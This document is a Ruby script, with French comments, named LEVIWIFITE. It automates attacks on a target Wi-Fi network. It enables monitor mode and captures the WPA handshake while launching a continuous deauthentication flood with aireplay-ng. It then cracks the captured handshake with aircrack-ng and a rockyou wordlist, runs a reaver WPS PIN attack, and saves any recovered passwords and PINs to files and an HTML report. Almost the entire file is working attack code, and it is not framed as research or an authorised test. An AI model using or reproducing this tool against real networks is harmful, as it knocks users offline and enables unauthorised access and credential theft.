#!/usr/bin/env ruby

# LEVIWIFITE - Composant Ruby pour Attaques Avancées
# Coordination avec Python et Bash

require 'optparse'
require 'json'
require 'fileutils'
require 'time'
require 'open3'

class LeviWifiteRuby
  attr_reader :config, :results
  
  def initialize
    @config = {
      interface: 'wlan0',
      target_bssid: nil,
      target_essid: nil,
      output_dir: 'results',
      attack_timeout: 300,
      wordlist_path: '/usr/share/wordlists/rockyou.txt'
    }
    @results = []
    @attack_processes = []
  end
  
  def parse_arguments
    OptionParser.new do |opts|
      opts.banner = "Usage: ruby_attack.rb [OPTIONS]"
      
      opts.on('-i', '--interface INTERFACE', 'Interface WiFi') do |v|
        @config[:interface] = v
      end
      
      opts.on('-t', '--target BSSID', 'BSSID de la cible') do |v|
        @config[:target_bssid] = v
      end
      
      opts.on('-e', '--essid ESSID', 'ESSID de la cible') do |v|
        @config[:target_essid] = v
      end
      
      opts.on('-o', '--output DIR', 'Répertoire de sortie') do |v|
        @config[:output_dir] = v
      end
      
      opts.on('-h', '--help', 'Afficher cette aide') do
        puts opts
        exit
      end
    end.parse!
    
    validate_config
  end
  
  def validate_config
    unless @config[:target_bssid] && @config[:target_essid]
      puts "[-] Erreur: BSSID et ESSID de la cible requis"
      exit 1
    end
    
    unless Dir.exist?(@config[:output_dir])
      FileUtils.mkdir_p(@config[:output_dir])
    end
  end
  
  def log(message, level = 'INFO')
    timestamp = Time.now.strftime('%Y-%m-%d %H:%M:%S')
    puts "[#{timestamp}] [#{level}] #{message}"
  end
  
  def run_command(command, timeout = 30)
    log("Exécution: #{command}")
    
    begin
      stdout, stderr, status = Open3.capture3(command, timeout: timeout)
      
      if status.success?
        log("Commande réussie: #{command}")
        return { success: true, stdout: stdout, stderr: stderr }
      else
        log("Commande échouée: #{command}", 'ERROR')
        return { success: false, stdout: stdout, stderr: stderr, exit_code: status.exitstatus }
      end
    rescue => e
      log("Exception lors de l'exécution: #{e.message}", 'ERROR')
      return { success: false, error: e.message }
    end
  end
  
  def start_monitor_mode
    log("Activation du mode monitor sur #{@config[:interface]}")
    
    result = run_command("airmon-ng start #{@config[:interface]}")
    if result[:success]
      log("Mode monitor activé avec succès")
      return true
    else
      log("Échec de l'activation du mode monitor", 'ERROR')
      return false
    end
  end
  
  def capture_handshake
    log("Début de la capture du handshake")
    
    # Créer le nom du fichier de capture
    capture_file = File.join(@config[:output_dir], "handshake_#{@config[:target_bssid].gsub(':', '')}.cap")
    
    # Lancer airodump-ng pour capturer le handshake
    command = "airodump-ng -c #{get_channel} --bssid #{@config[:target_bssid]} -w #{capture_file} #{@config[:interface]}"
    
    log("Lancement de la capture: #{command}")
    
    # Démarrer la capture en arrière-plan
    pid = spawn(command)
    @attack_processes << pid
    
    # Attendre un peu pour la capture
    sleep 5
    
    # Lancer l'attaque de déauthentification
    deauth_pid = launch_deauth_attack
    @attack_processes << deauth_pid if deauth_pid
    
    # Attendre la capture
    log("Attente de la capture du handshake...")
    sleep 15
    
    # Arrêter les processus
    stop_attack_processes
    
    # Vérifier si le handshake a été capturé
    if File.exist?(capture_file) && File.size(capture_file) > 0
      log("Handshake capturé avec succès: #{capture_file}")
      return capture_file
    else
      log("Échec de la capture du handshake", 'WARNING')
      return nil
    end
  end
  
  def get_channel
    log("Détermination du canal de la cible")
    
    # Scanner pour trouver le canal
    result = run_command("airodump-ng #{@config[:interface]} --output-format csv", 10)
    
    if result[:success]
      lines = result[:stdout].split("\n")
      lines.each do |line|
        if line.include?(@config[:target_bssid])
          parts = line.split(',')
          if parts.length >= 4
            channel = parts[3].strip
            log("Canal trouvé: #{channel}")
            return channel
          end
        end
      end
    end
    
    log("Canal non trouvé, utilisation du canal 1 par défaut", 'WARNING')
    return 1
  end
  
  def launch_deauth_attack
    log("Lancement de l'attaque de déauthentification")
    
    command = "aireplay-ng --deauth 0 -a #{@config[:target_bssid]} #{@config[:interface]}"
    log("Commande deauth: #{command}")
    
    begin
      pid = spawn(command, out: '/dev/null', err: '/dev/null')
      log("Attaque deauth lancée avec PID: #{pid}")
      return pid
    rescue => e
      log("Échec du lancement de l'attaque deauth: #{e.message}", 'ERROR')
      return nil
    end
  end
  
  def stop_attack_processes
    log("Arrêt des processus d'attaque")
    
    @attack_processes.each do |pid|
      begin
        Process.kill('TERM', pid)
        log("Processus #{pid} arrêté")
      rescue => e
        log("Impossible d'arrêter le processus #{pid}: #{e.message}", 'WARNING')
      end
    end
    
    @attack_processes.clear
  end
  
  def crack_handshake(handshake_file)
    log("Tentative de crack du handshake")
    
    unless File.exist?(@config[:wordlist_path])
      log("Wordlist non trouvée: #{@config[:wordlist_path]}", 'WARNING')
      return false
    end
    
    command = "aircrack-ng #{handshake_file} -w #{@config[:wordlist_path]}"
    log("Lancement du crack: #{command}")
    
    result = run_command(command, @config[:attack_timeout])
    
    if result[:success]
      if result[:stdout].include?('KEY FOUND!')
        log("🎉 Clé WiFi trouvée!", 'SUCCESS')
        extract_password(result[:stdout])
        return true
      else
        log("Clé non trouvée dans le handshake", 'WARNING')
        return false
      end
    else
      log("Échec du crack du handshake", 'ERROR')
      return false
    end
  end
  
  def extract_password(crack_output)
    log("Extraction du mot de passe")
    
    # Chercher le mot de passe dans la sortie
    if crack_output =~ /KEY FOUND! \[ (.*) \]/
      password = $1
      log("Mot de passe extrait: #{password}")
      
      # Sauvegarder le résultat
      result_file = File.join(@config[:output_dir], "password_#{@config[:target_bssid].gsub(':', '')}.txt")
      File.write(result_file, "ESSID: #{@config[:target_essid]}\nBSSID: #{@config[:target_bssid]}\nPassword: #{password}\n")
      
      @results << {
        target: @config[:target_essid],
        bssid: @config[:target_bssid],
        password: password,
        timestamp: Time.now.iso8601,
        success: true
      }
    end
  end
  
  def perform_wps_attack
    log("Tentative d'attaque WPS")
    
    command = "reaver -i #{@config[:interface]} -b #{@config[:target_bssid]} -vv"
    log("Lancement de l'attaque WPS: #{command}")
    
    result = run_command(command, 180)  # 3 minutes pour WPS
    
    if result[:success]
      if result[:stdout].include?('WPS PIN:')
        log("Attaque WPS réussie!", 'SUCCESS')
        extract_wps_pin(result[:stdout])
        return true
      else
        log("Attaque WPS échouée", 'WARNING')
        return false
      end
    else
      log("Échec de l'attaque WPS", 'ERROR')
      return false
    end
  end
  
  def extract_wps_pin(wps_output)
    log("Extraction du PIN WPS")
    
    if wps_output =~ /WPS PIN: '(\d+)'/
      pin = $1
      log("PIN WPS trouvé: #{pin}")
      
      # Sauvegarder le résultat
      result_file = File.join(@config[:output_dir], "wps_#{@config[:target_bssid].gsub(':', '')}.txt")
      File.write(result_file, "ESSID: #{@config[:target_essid]}\nBSSID: #{@config[:target_bssid]}\nWPS PIN: #{pin}\n")
      
      @results << {
        target: @config[:target_essid],
        bssid: @config[:target_bssid],
        wps_pin: pin,
        timestamp: Time.now.iso8601,
        success: true,
        attack_type: 'WPS'
      }
    end
  end
  
  def generate_ruby_report
    log("Génération du rapport Ruby")
    
    html_content = <<~HTML
      <!DOCTYPE html>
      <html>
      <head>
          <title>Rapport Ruby - LEVIWIFITE</title>
          <style>
              body { font-family: 'Courier New', monospace; margin: 20px; background: #1a1a1a; color: #00ff00; }
              .header { background: #2d2d2d; padding: 20px; border-radius: 5px; border: 2px solid #00ff00; }
              .result { border: 1px solid #00ff00; margin: 10px 0; padding: 15px; border-radius: 5px; }
              .success { border-left: 5px solid #00ff00; }
              .failure { border-left: 5px solid #ff0000; }
              .code { background: #000; padding: 10px; border-radius: 3px; font-family: monospace; }
              .timestamp { color: #888; font-size: 0.9em; }
          </style>
      </head>
      <body>
          <div class="header">
              <h1>🐍 Rapport Ruby - LEVIWIFITE</h1>
              <p>Généré le: #{Time.now.strftime('%Y-%m-%d %H:%M:%S')}</p>
              <p>Interface: #{@config[:interface]}</p>
          </div>
          
          <h2>🎯 Cible</h2>
          <div class="result">
              <p><strong>ESSID:</strong> #{@config[:target_essid]}</p>
              <p><strong>BSSID:</strong> #{@config[:target_bssid]}</p>
          </div>
          
          <h2>⚔️ Résultats des Attaques</h2>
    HTML
    
    if @results.empty?
      html_content += '<div class="result"><p>Aucun résultat disponible</p></div>'
    else
      @results.each do |result|
        status_class = result[:success] ? 'success' : 'failure'
        html_content += <<~HTML
          <div class="result #{status_class}">
              <h3>#{result[:target]}</h3>
              <p><strong>BSSID:</strong> #{result[:bssid]}</p>
              <p><strong>Timestamp:</strong> #{result[:timestamp]}</p>
              <p><strong>Statut:</strong> #{result[:success] ? '✅ Succès' : '❌ Échec'}</p>
        HTML
        
        if result[:password]
          html_content += "<p><strong>Mot de passe:</strong> #{result[:password]}</p>"
        end
        
        if result[:wps_pin]
          html_content += "<p><strong>PIN WPS:</strong> #{result[:wps_pin]}</p>"
        end
        
        if result[:attack_type]
          html_content += "<p><strong>Type d'attaque:</strong> #{result[:attack_type]}</p>"
        end
        
        html_content += '</div>'
      end
    end
    
    html_content += <<~HTML
          <h2>🔧 Configuration</h2>
          <div class="code">
              <pre>#{JSON.pretty_generate(@config)}</pre>
          </div>
          
          <h2>📊 Statistiques</h2>
          <div class="result">
              <p>Total des attaques: #{@results.length}</p>
              <p>Attaques réussies: #{@results.count { |r| r[:success] }}</p>
              <p>Attaques échouées: #{@results.count { |r| !r[:success] }}</p>
          </div>
      </body>
      </html>
    HTML
    
    report_file = File.join(@config[:output_dir], "rapport_ruby.html")
    File.write(report_file, html_content)
    
    log("Rapport Ruby généré: #{report_file}")
    return report_file
  end
  
  def run_attack_sequence
    log("🚀 Début de la séquence d'attaque Ruby")
    
    begin
      # 1. Mode monitor
      unless start_monitor_mode
        log("Impossible de continuer sans mode monitor", 'ERROR')
        return false
      end
      
      # 2. Capture du handshake
      handshake_file = capture_handshake
      
      # 3. Tentative de crack du handshake
      if handshake_file
        crack_success = crack_handshake(handshake_file)
        @results << {
          target: @config[:target_essid],
          bssid: @config[:target_bssid],
          timestamp: Time.now.iso8601,
          success: crack_success,
          attack_type: 'Handshake'
        }
      end
      
      # 4. Attaque WPS (en parallèle)
      wps_success = perform_wps_attack
      
      # 5. Génération du rapport
      generate_ruby_report
      
      log("✅ Séquence d'attaque Ruby terminée")
      return true
      
    rescue => e
      log("Erreur lors de l'attaque: #{e.message}", 'ERROR')
      log(e.backtrace.join("\n"), 'ERROR')
      return false
    ensure
      stop_attack_processes
    end
  end
end

# Point d'entrée principal
if __FILE__ == $0
  begin
    attacker = LeviWifiteRuby.new
    attacker.parse_arguments
    attacker.run_attack_sequence
  rescue => e
    puts "[-] Erreur fatale: #{e.message}"
    puts e.backtrace.join("\n")
    exit 1
  end
end
